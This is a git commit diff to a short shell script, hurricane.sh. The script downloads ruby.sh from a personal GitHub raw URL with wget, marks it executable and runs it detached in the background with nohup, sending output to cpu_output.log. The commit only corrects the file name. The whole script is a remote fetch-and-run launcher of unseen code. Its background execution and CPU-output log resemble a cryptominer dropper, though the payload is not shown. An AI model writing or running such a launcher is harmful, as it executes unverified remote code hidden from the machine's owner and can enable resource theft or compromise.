87e79c492187e1c825962b068059ab08f4328395
dgreenawnareen <dgreen2@tbirds.cloud.edu>
2025-09-05 20:57:09 +0100

    Update hurricane.sh

--- hurricane.sh
+++ hurricane.sh
@@ -5,6 +5,6 @@ mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
 wget https://raw.githubusercontent.com/dgreenawnareen/ruby/refs/heads/main/ruby.sh
 
-chmod +x start.sh
+chmod +x ruby.sh
 
-nohup ./start.sh > cpu_output.log 2>&1 &
+nohup ./ruby.sh > cpu_output.log 2>&1 &
